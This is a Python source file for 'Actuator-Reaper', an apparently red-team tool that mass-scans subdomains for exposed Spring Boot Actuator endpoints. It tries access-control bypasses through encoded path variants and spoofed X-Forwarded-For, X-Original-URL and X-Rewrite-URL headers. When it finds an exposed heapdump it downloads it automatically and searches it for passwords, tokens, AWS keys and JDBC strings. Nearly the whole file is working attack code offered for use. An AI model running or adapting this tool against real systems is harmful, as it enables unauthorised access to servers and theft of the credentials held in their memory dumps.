#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║                    ACTUATOR-REAPER v1.0                          ║
║              Spring Boot Actuator Hunter Framework                ║
║                   By: @HackSyndicate Style                        ║
╚═══════════════════════════════════════════════════════════════════╝

[!] Framework for hunting Spring Boot Actuator vulnerabilities
[!] Modes: Manual | Auto-Hunt (Multi-Program)
"""

import sys
import os
import argparse
import requests
import json
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from datetime import datetime
from typing import List, Dict
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════════
# COLORS & BANNER
# ═══════════════════════════════════════════════════════════════════

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

def banner():
    banner_text = f"""
{Colors.CYAN}
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║     ▄████████ ▄████████     ███     ███    █▄   ▄████████   ║
    ║    ███    ███ ███    ███ ▀█████████▄ ███    ███ ███    ███   ║
    ║    ███    ███ ███    █▀     ▀███▀▀██ ███    ███ ███    ███   ║
    ║    ███    ███ ███            ███   ▀ ███    ███ ███    ███   ║
    ║  ▀███████████ ███            ███     ███    ███ ███    ███   ║
    ║    ███    ███ ███    █▄      ███     ███    ███ ███    ███   ║
    ║    ███    ███ ███    ███     ███     ███    ███ ███    ███   ║
    ║    ███    █▀  ████████▀     ▄████▀   ████████▀  ████████▀    ║
    ║                                                               ║
    ║              REAPER - Spring Boot Actuator Hunter            ║
    ║                    v1.0 | @HackSyndicate                      ║
    ╚═══════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.YELLOW}[*]{Colors.ENDC} Framework: Actuator-Reaper
{Colors.YELLOW}[*]{Colors.ENDC} Author: Red Team Operator
{Colors.YELLOW}[*]{Colors.ENDC} Purpose: Hunt Spring Boot Actuator Vulnerabilities
{Colors.YELLOW}[*]{Colors.ENDC} Modes: Manual | Auto-Hunt
{Colors.CYAN}{"═" * 70}{Colors.ENDC}
"""
    print(banner_text)

# ═══════════════════════════════════════════════════════════════════
# CORE ENGINE
# ═══════════════════════════════════════════════════════════════════

class ActuatorReaper:
    def __init__(self, threads=20, timeout=10, verbose=False):
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        
        # Critical endpoints
        self.critical_endpoints = [
            'heapdump',
            'env',
            'configprops',
            'shutdown'
        ]
        
        # High value endpoints
        self.high_value_endpoints = [
            'threaddump',
            'trace',
            'loggers',
            'jolokia',
            'gateway/routes',
            'beans',
            'mappings'
        ]
        
        # Results storage
        self.results = {
            'vulnerable': [],
            'protected': [],
            'not_found': []
        }
        
        self.lock = threading.Lock()
        
    def log(self, message, level="info"):
        """Logging with colors"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "success":
            print(f"{Colors.GREEN}[+]{Colors.ENDC} [{timestamp}] {message}")
        elif level == "error":
            print(f"{Colors.RED}[-]{Colors.ENDC} [{timestamp}] {message}")
        elif level == "warning":
            print(f"{Colors.YELLOW}[!]{Colors.ENDC} [{timestamp}] {message}")
        elif level == "critical":
            print(f"{Colors.FAIL}{Colors.BOLD}[!!!]{Colors.ENDC} [{timestamp}] {message}")
        elif level == "info":
            print(f"{Colors.CYAN}[*]{Colors.ENDC} [{timestamp}] {message}")
        else:
            print(f"[*] [{timestamp}] {message}")
    
    def test_actuator_base(self, target: str) -> tuple:
        """Test if actuator is accessible"""
        try:
            url = f"{target}/actuator"
            r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            
            if r.status_code == 200:
                if 'application/vnd.spring-boot.actuator' in r.headers.get('Content-Type', ''):
                    try:
                        data = r.json()
                        endpoints = list(data.get('_links', {}).keys()) if '_links' in data else []
                        return True, endpoints
                    except:
                        return True, []
            return False, []
        except Exception as e:
            if self.verbose:
                self.log(f"Error testing {target}: {e}", "error")
            return False, []
    
    def test_endpoint(self, target: str, endpoint: str) -> Dict:
        """Test specific endpoint with bypasses"""
        base_url = f"{target}/actuator/{endpoint}"
        
        # Bypass variants
        variants = [
            f"/actuator/{endpoint}",
            f"/actuator/{endpoint}%23",
            f"/actuator/{endpoint}/",
            f"/actuator/{endpoint}%2523",
            f"/actuator/./{endpoint}",
            f"/actuator/{endpoint.upper()}",
        ]
        
        headers_variants = [
            {},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Original-URL': f'/actuator/{endpoint}'},
            {'X-Rewrite-URL': f'/actuator/{endpoint}'},
        ]
        
        for variant in variants:
            for headers in headers_variants:
                try:
                    url = f"{target}{variant}"
                    custom_headers = {**self.session.headers, **headers}
                    r = self.session.get(url, timeout=self.timeout, headers=custom_headers)
                    
                    if r.status_code == 200:
                        return {
                            'status': 'vulnerable',
                            'endpoint': endpoint,
                            'url': url,
                            'size': len(r.content),
                            'bypass': variant,
                            'headers': headers if headers else None
                        }
                    elif r.status_code in [401, 403]:
                        return {
                            'status': 'protected',
                            'endpoint': endpoint,
                            'url': url,
                            'code': r.status_code
                        }
                except Exception as e:
                    if self.verbose:
                        self.log(f"Error testing {url}: {e}", "error")
                    continue
        
        return {'status': 'not_found', 'endpoint': endpoint}
    
    def scan_target(self, target: str) -> Dict:
        """Complete scan of a single target"""
        target = target.strip().rstrip('/')
        
        if not target.startswith('http'):
            target = f"https://{target}"
        
        self.log(f"Scanning: {target}", "info")
        
        # Test if Spring Boot
        is_actuator, endpoints = self.test_actuator_base(target)
        
        if not is_actuator:
            if self.verbose:
                self.log(f"Not Spring Boot or actuator not exposed: {target}", "error")
            return None
        
        self.log(f"Spring Boot Actuator detected! Available endpoints: {len(endpoints)}", "success")
        
        result = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'actuator_exposed': True,
            'endpoints_available': endpoints,
            'critical_findings': [],
            'high_value_findings': [],
            'protected_endpoints': []
        }
        
        # Test critical endpoints
        self.log(f"Testing critical endpoints...", "info")
        for endpoint in self.critical_endpoints:
            endpoint_result = self.test_endpoint(target, endpoint)
            
            if endpoint_result['status'] == 'vulnerable':
                self.log(f"CRITICAL VULN: {endpoint} is EXPOSED!", "critical")
                result['critical_findings'].append(endpoint_result)
                
                # Auto-download heapdump
                if endpoint == 'heapdump':
                    self.download_heapdump(target, endpoint_result['url'])
                    
            elif endpoint_result['status'] == 'protected':
                if self.verbose:
                    self.log(f"Protected: {endpoint} ({endpoint_result['code']})", "warning")
                result['protected_endpoints'].append(endpoint_result)
        
        # Test high value endpoints
        self.log(f"Testing high-value endpoints...", "info")
        for endpoint in self.high_value_endpoints:
            endpoint_result = self.test_endpoint(target, endpoint)
            
            if endpoint_result['status'] == 'vulnerable':
                self.log(f"HIGH VALUE: {endpoint} is exposed!", "success")
                result['high_value_findings'].append(endpoint_result)
        
        with self.lock:
            self.results['vulnerable'].append(result)
        
        return result
    
    def download_heapdump(self, target: str, url: str):
        """Download heapdump file"""
        try:
            domain = urlparse(target).netloc.replace(':', '_')
            filename = f"heapdumps/heapdump_{domain}_{int(time.time())}.hprof"
            
            os.makedirs('heapdumps', exist_ok=True)
            
            self.log(f"Downloading heapdump from {url}...", "info")
            r = self.session.get(url, timeout=60, stream=True)
            
            if r.status_code == 200:
                with open(filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                size_mb = os.path.getsize(filename) / (1024 * 1024)
                self.log(f"Heapdump saved: {filename} ({size_mb:.2f} MB)", "success")
                
                # Quick analysis
                self.quick_heapdump_analysis(filename)
                
        except Exception as e:
            self.log(f"Error downloading heapdump: {e}", "error")
    
    def quick_heapdump_analysis(self, filename: str):
        """Quick analysis for secrets in heapdump"""
        self.log(f"Running quick analysis on {filename}...", "info")
        
        patterns = {
            'password': 0,
            'token': 0,
            'secret': 0,
            'api_key': 0,
            'apikey': 0,
            'jwt': 0,
            'bearer': 0,
            'authorization': 0,
            'credentials': 0,
            'jdbc': 0,
            'aws': 0,
            'key': 0
        }
        
        try:
            with open(filename, 'rb') as f:
                content = f.read()
                text = content.decode('latin-1', errors='ignore').lower()
                
                for pattern in patterns.keys():
                    count = text.count(pattern)
                    patterns[pattern] = count
                    
                self.log(f"Analysis results for {filename}:", "info")
                for pattern, count in patterns.items():
                    if count > 10:  # Threshold
                        self.log(f"  → '{pattern}': {count} occurrences", "warning")
                        
        except Exception as e:
            self.log(f"Error analyzing heapdump: {e}", "error")
    
    def scan_multiple_targets(self, targets: List[str]):
        """Scan multiple targets with threading"""
        self.log(f"Starting scan on {len(targets)} targets with {self.threads} threads", "info")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_target, target): target for target in targets}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception as e:
                    if self.verbose:
                        self.log(f"Error scanning target: {e}", "error")
        
        self.print_summary()
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Colors.CYAN}{'═' * 70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}[SCAN SUMMARY]{Colors.ENDC}\n")
        
        vulnerable_count = len(self.results['vulnerable'])
        
        if vulnerable_count > 0:
            print(f"{Colors.GREEN}[+]{Colors.ENDC} Vulnerable targets: {vulnerable_count}\n")
            
            for result in self.results['vulnerable']:
                print(f"{Colors.YELLOW}Target:{Colors.ENDC} {result['target']}")
                
                if result['critical_findings']:
                    print(f"  {Colors.RED}[CRITICAL]{Colors.ENDC} Exposed endpoints:")
                    for finding in result['critical_findings']:
                        size_kb = finding['size'] / 1024
                        print(f"    → {finding['endpoint']}: {finding['url']} ({size_kb:.2f} KB)")
                
                if result['high_value_findings']:
                    print(f"  {Colors.YELLOW}[HIGH]{Colors.ENDC} Exposed endpoints:")
                    for finding in result['high_value_findings']:
                        print(f"    → {finding['endpoint']}: {finding['url']}")
                
                print()
        else:
            print(f"{Colors.RED}[-]{Colors.ENDC} No vulnerable targets found\n")
        
        print(f"{Colors.CYAN}{'═' * 70}{Colors.ENDC}")
        
        # Save results to JSON
        self.save_results()
    
    def save_results(self):
        """Save results to JSON file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results/actuator_scan_{timestamp}.json"
        
        os.makedirs('results', exist_ok=True)
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
        
        self.log(f"Results saved to: {filename}", "success")

# ═══════════════════════════════════════════════════════════════════
# AUTO-HUNT MODE
# ═══════════════════════════════════════════════════════════════════

class AutoHunter:
    def __init__(self, reaper: ActuatorReaper):
        self.reaper = reaper
        
    def check_tools(self):
        """Check if required tools are installed"""
        tools = ['subfinder', 'httpx']
        missing = []
        
        for tool in tools:
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            self.reaper.log(f"Missing tools: {', '.join(missing)}", "error")
            self.reaper.log("Install with:", "info")
            self.reaper.log("  go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", "info")
            self.reaper.log("  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest", "info")
            return False
        
        return True
    
    def run_subfinder(self, domains_file: str) -> str:
        """Run subfinder to find subdomains"""
        output_file = "subfinder_output.txt"
        
        self.reaper.log(f"Running subfinder on {domains_file}...", "info")
        
        cmd = [
            'subfinder',
            '-dL', domains_file,
            '-all',
            '-silent',
            '-o', output_file
        ]
        
        try:
            subprocess.run(cmd, check=True)
            
            with open(output_file, 'r') as f:
                subdomains = f.readlines()
            
            self.reaper.log(f"Found {len(subdomains)} subdomains", "success")
            return output_file
            
        except subprocess.CalledProcessError as e:
            self.reaper.log(f"Error running subfinder: {e}", "error")
            return None
    
    def run_httpx(self, subdomains_file: str) -> str:
        """Run httpx to find live hosts"""
        output_file = "livehosts.txt"
        
        self.reaper.log(f"Running httpx on {subdomains_file}...", "info")
        
        cmd = [
            'httpx',
            '-l', subdomains_file,
            '-silent',
            '-o', output_file
        ]
        
        try:
            subprocess.run(cmd, check=True)
            
            with open(output_file, 'r') as f:
                livehosts = f.readlines()
            
            self.reaper.log(f"Found {len(livehosts)} live hosts", "success")
            return output_file
            
        except subprocess.CalledProcessError as e:
            self.reaper.log(f"Error running httpx: {e}", "error")
            return None
    
    def auto_hunt(self, domains_file: str):
        """Automated hunting workflow"""
        self.reaper.log("Starting AUTO-HUNT mode...", "info")
        
        # Check tools
        if not self.check_tools():
            return
        
        # Step 1: Subfinder
        subdomains_file = self.run_subfinder(domains_file)
        if not subdomains_file:
            return
        
        # Step 2: Httpx
        livehosts_file = self.run_httpx(subdomains_file)
        if not livehosts_file:
            return
        
        # Step 3: Scan with Actuator-Reaper
        self.reaper.log("Starting Actuator scan on live hosts...", "info")
        
        with open(livehosts_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        self.reaper.scan_multiple_targets(targets)

# ═══════════════════════════════════════════════════════════════════
# CLI INTERFACE
# ═══════════════════════════════════════════════════════════════════

def main():
    banner()
    
    parser = argparse.ArgumentParser(
        description="Actuator-Reaper - Spring Boot Actuator Hunter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Manual mode - Single target
  python3 actuator-reaper.py -u https://target.com
  
  # Manual mode - Multiple targets from file
  python3 actuator-reaper.py -f targets.txt -t 50
  
  # Auto-Hunt mode - Full automation
  python3 actuator-reaper.py --auto-hunt -d domains.txt -t 100
  
  # Verbose mode
  python3 actuator-reaper.py -f targets.txt -v
        """
    )
    
    # Mode selection
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument('-u', '--url', help='Single target URL')
    mode_group.add_argument('-f', '--file', help='File containing target URLs/domains')
    mode_group.add_argument('--auto-hunt', action='store_true', help='Auto-Hunt mode (subfinder + httpx + scan)')
    
    # Auto-hunt specific
    parser.add_argument('-d', '--domains', help='Domains file for auto-hunt mode')
    
    # General options
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Initialize reaper
    reaper = ActuatorReaper(
        threads=args.threads,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    # Execute based on mode
    if args.auto_hunt:
        if not args.domains:
            print(f"{Colors.RED}[-]{Colors.ENDC} Auto-hunt mode requires -d/--domains file")
            sys.exit(1)
        
        hunter = AutoHunter(reaper)
        hunter.auto_hunt(args.domains)
        
    elif args.url:
        reaper.scan_target(args.url)
        reaper.print_summary()
        
    elif args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        reaper.scan_multiple_targets(targets)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!]{Colors.ENDC} Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[-]{Colors.ENDC} Fatal error: {e}")
        sys.exit(1)
